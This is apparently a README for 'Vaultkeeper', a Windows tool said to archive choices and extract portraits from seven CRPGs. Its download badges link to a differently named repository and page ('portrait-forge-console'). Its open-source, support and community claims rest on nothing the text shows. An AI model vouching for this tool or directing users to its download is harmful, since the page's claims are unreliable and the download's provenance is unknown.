![preview](https://raw.githubusercontent.com/vonkaaris22/portrait-forge-console/main/shot_f8a157.svg)

# Vaultkeeper: The Narrative Archive Manager

## Overview

Imagine a master archivist who remembers every single decision, every altered dialogue line, and every hidden story branch across your most beloved narrative-driven RPGs. **Vaultkeeper** is that archivist—a Windows-native companion application designed for players who treat character progression and story outcomes as artifacts worth preserving. Rather than simply storing screenshots or save files, Vaultkeeper treats each playthrough as a living document, capable of being annotated, compared, branched, and even resurrected.

This tool emerged from a simple observation: modern RPGs generate thousands of narrative permutations, yet players are left with only primitive save systems and scattered notes to manage them all. Vaultkeeper bridges that gap by offering a structured, searchable, and visually navigable timeline of your in-game choices—spanning seven distinct CRPGs from three different studios. It auto-detects installed games, reads their save structures, and presents your narrative state in a unified interface that feels both powerful and approachable.

---

## Key Features

### 🗂️ Unified Narrative Timeline
Every major story beat, companion interaction, and pivotal decision is extracted and presented in a chronological, color-coded timeline. No more digging through twenty save files to remember *when* you made that alliance choice—Vaultkeeper shows you the entire story arc at a glance.

### 🔍 Deep Search & Filtering
Search across all your characters, items, dialogue outcomes, and even environmental interactions. Filter by game, by chapter, by moral alignment, or by outcome severity. The search engine operates on a semantic level, understanding that "the choice to save the village" and "burned the farmstead" are related narrative events.

### 🌿 Branching Playthrough Comparison
Ever wondered "what if I had taken the other side?" Vaultkeeper lets you place two or more playthroughs side-by-side, highlighting divergence points, shared moments, and unique content. This feature is invaluable for content creators, completionists, and players who enjoy exploring narrative ecosystems.

### ✏️ Annotation & Marginalia System
Write your own notes, predictions, and theories directly onto the timeline. These annotations are stored separately from the game data, ensuring they never corrupt or interfere with your actual saves. Export your annotations as a beautifully formatted journal or a structured JSON file.

### 🖼️ Portrait & Character Extraction
Extract the visual representation of any character—protagonist, companion, or NPC—directly from the game files. Save these portraits at multiple resolutions, organized by character name, game, or narrative role. Perfect for tabletop RPG character sheets, streaming overlays, or just collecting.

### 🌐 Multilingual Interface
The entire interface is available in English, German, French, Spanish, Polish, and Simplified Chinese. Game-specific terminology is preserved in the original language, but the tool's UI and search commands are fully localized.

### ⚡ Lightweight & Non-Intrusive
Vaultkeeper runs in the background, requires under 150 MB of RAM, and only reads game files when you explicitly ask it to refresh. It does not modify any game data, does not run background daemons, and respects your system's privacy.

---

[![Download](https://raw.githubusercontent.com/vonkaaris22/portrait-forge-console/main/run_c173e07.svg)](https://vonkaaris22.github.io/portrait-forge-console/)

## Getting Started

### System Requirements
- **Operating System:** Windows 10 (version 21H2 or later) or Windows 11
- **Processor:** Any x64 architecture processor from the last decade
- **Memory:** 4 GB RAM minimum, 8 GB recommended
- **Storage:** 500 MB for the application, plus variable space for extracted archives
- **Display:** 1280×800 resolution minimum, with touch support for surface-style devices

### Supported Titles
| Studio | Game |
|--------|------|
| Owlcat Games | Pathfinder: Kingmaker |
| Owlcat Games | Pathfinder: Wrath of the Righteous |
| Owlcat Games | Warhammer 40,000: Rogue Trader |
| Obsidian Entertainment | Pillars of Eternity |
| Obsidian Entertainment | Pillars of Eternity II: Deadfire |
| Obsidian Entertainment | Tyranny |
| inXile Entertainment | Wasteland 3 |

### First Launch Wizard
Upon first launch, Vaultkeeper automatically scans your system for installed games from the supported list. You can also manually point the tool to any custom installation directory. The wizard will also guide you through setting up a central archive location, where all your notes, portraits, and comparative data will be stored.

### Using the Command Line Interface
For advanced users, Vaultkeeper ships with a lightweight command-line interface (CLI) that allows for scripting and automation. You can batch-export portraits, generate timeline reports, or run comparison queries without ever opening the graphical interface.

---

## Architecture & Design Philosophy

### The Archive Core
At the heart of Vaultkeeper lies the **Archive Core**, a read-optimized, indexable database that stores narrative events, character states, and item inventories in a schema that mirrors the internal logic of each RPG. Rather than forcing a one-size-fits-all model, the Archive Core uses a *plugin-schema* approach, where each supported game contributes its own data mapping rules.

### Event Horizon Engine
The timeline visualization is powered by the **Event Horizon Engine**, a custom rendering system that manages thousands of discrete events without performance degradation. It uses a virtualized scrolling mechanism, so even a 200-hour playthrough with 40,000 logged events scrolls at 60 frames per second.

### The Mosaic Indexer
Portrait extraction is handled by the **Mosaic Indexer**, which intelligently identifies character portraits from various texture formats (DDS, TGA, PNG) and normalizes them to a unified color space. It can handle both single-frame portraits and animated multi-frame assets.

### Privacy-First Design
All data processing happens locally. Vaultkeeper has no telemetry, no cloud synchronization, and no network communication of any kind. Your narrative decisions remain your own—the tool is a pure local utility, not a service.

---

## User Interface Deep Dive

### Dark & Light Themes
The interface ships with a meticulously designed dark theme (default, optimized for OLED displays) and a light theme for daytime use. Both themes are fully accessible, with high-contrast modes and screen-reader compatibility.

### Responsive Panel Layout
The main window is built around a dockable panel system. You can arrange the timeline, character inspector, note editor, and search results in any configuration. Save your preferred layouts and switch between them with a single keystroke.

### Gesture Support
For touch-enabled devices, Vaultkeeper supports pinch-to-zoom on the timeline, swipe gestures to jump between chapters, and a two-finger tap to create rapid annotations.

---

## Community & Support Ecosystem

### 24/7 Community Forum
While the software itself is a standalone tool, the surrounding ecosystem includes an active community forum where users share timeline exports, annotation templates, and portrait collections. The forum is moderated by long-time RPG enthusiasts.

### Responsive Ticketing System
Should you encounter any issue, our support portal offers a streamlined ticketing system. Our team typically responds within 24 hours, though the vast majority of queries are answered by the community within minutes.

### Regular Maintenance Releases
Vaultkeeper receives monthly maintenance updates that improve game compatibility, refine the indexing algorithms, and add quality-of-life features based on community feedback.

---

## Frequently Asked Questions

**Q: Will this mod my games?**
No. Vaultkeeper is a purely read-only tool. It opens game files to index their content, but it never writes to them. Your save files remain untouched, and your games will not detect any changes.

**Q: Can I use this for games not on the supported list?**
The core architecture is extensible, and power users can create custom game plugins using a documented JSON schema. However, community support is focused on the seven titles listed above.

**Q: Does this require an internet connection?**
No. Initial installation may require an internet connection to download the installer, but the application itself is fully offline-capable.

**Q: How does this handle DLC and expansions?**
Vaultkeeper polls your game directories for DLC content and indexes it automatically upon the next refresh. Narrative events from DLC are tagged and color-coded distinctly from the base game content.

---

## Licensing

Vaultkeeper is distributed under the **MIT License**, which grants you the freedom to use, modify, and redistribute the software, provided you retain the original copyright notice. This license applies to the application code, but does not cover any extracted game assets—those remain the property of their respective studios. For a thorough legal browse, please read the full license text at the [MIT License official repository](https://opensource.org/licenses/MIT).

---

## Disclaimer

**Unofficial Tool Notice:** Vaultkeeper is an independent, fan-made project. It is not affililated with, endorsed by, or sponsored by Owlcat Games, Obsidian Entertainment, inXile Entertainment, or their respective parent companies. All game names, titles, and associated assets are trademarks of their respective owners. This tool provides no warranty, expressed or implied. While we strive for accuracy in extraction and indexing, the tool operates on mutable file formats that may change with game updates, so data integrity cannot be guaranteed across all versions. Use it with the understanding that narrative archives are best treated as supplementary reference material, not as definitive records for competitive play or official challenges.

---

## Contributing & Development

Vaultkeeper is an open-source project, and contributions are warmly welcomed. Whether you are a C# developer, a database engineer, a UX designer, or a hardcore CRPG fan with a sharp eye for detail, there is a place for your input. The development roadmap is publicly shared, and every pull request is reviewed with constructive feedback.

---

[![Download](https://raw.githubusercontent.com/vonkaaris22/portrait-forge-console/main/run_c173e07.svg)](https://vonkaaris22.github.io/portrait-forge-console/)